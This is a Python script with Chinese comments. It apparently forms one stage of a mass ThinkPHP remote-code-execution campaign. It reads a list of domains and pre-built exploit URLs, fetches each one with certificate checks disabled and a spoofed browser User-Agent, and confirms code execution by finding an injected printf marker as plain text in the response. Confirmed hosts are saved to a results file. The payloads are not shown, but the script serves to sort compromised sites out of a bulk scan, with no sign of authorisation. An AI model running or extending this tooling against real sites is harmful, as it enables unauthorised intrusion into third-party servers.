#!/usr/bin/env python3
"""tp_rce_verify3.py - 终极验证: mark必须在纯文本正文(无HTML标签包裹)
真printf输出: <pre>tprce_mark_8842</pre> 或纯文本
"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
MARK = 'tprce_mark_8842'

def fetch_raw(url, timeout=12):
    try:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, headers, newurl):
                return None
        opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
        req = urllib.request.Request(url, headers=UA)
        r = opener.open(req, timeout=timeout)
        return r.status, r.read(50000).decode('utf-8', 'ignore'), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(50000).decode('utf-8', 'ignore'), e.geturl()
    except Exception:
        return 0, '', ''

def main():
    real = []
    with open('/tmp/tp_rce_verified.txt') as f:
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) < 3:
                continue
            dom, name, url = parts[0], parts[1], parts[2]
            st, b, fu = fetch_raw(url)
            if MARK not in b:
                continue
            # 找所有mark出现位置
            positions = [m.start() for m in re.finditer(re.escape(MARK), b)]
            real_pos = False
            for pos in positions:
                ctx = b[max(0,pos-100):pos+len(MARK)+100]
                # 真RCE: mark周围是纯文本/空白/pre
                # 排除: HTML属性内(<...mark...>), JS字符串内("...mark..."), URL编码
                if '%26' in ctx or '%3D' in ctx or '\\u0026' in ctx or '&#0' in ctx:
                    continue
                # 检查是否在<>内
                before = b[max(0,pos-200):pos]
                if before.rfind('<') > before.rfind('>'):
                    continue  # 在HTML标签内
                # 检查是否在引号内(JS/属性)
                quote_ctx = b[max(0,pos-50):pos]
                if '"' in quote_ctx and quote_ctx.rfind('"') > quote_ctx.rfind("'"):
                    continue
                # 通过: 纯文本位置
                real_pos = True
                print('REAL RCE: %s [%s] st=%d ctx=%s' % (dom, name, st, ctx[:100].replace(chr(10), ' ')), flush=True)
                real.append((dom, name, url))
                break
            if not real_pos:
                print('FALSE: %s [%s] st=%d (all refs in attrs/js)' % (dom, name, st), flush=True)
    print('=== REAL: %d ===' % len(real), flush=True)
    with open('/tmp/tp_rce_real2.txt', 'w') as f:
        for r in real:
            f.write('\t'.join(r) + '\n')

if __name__ == '__main__':
    main()
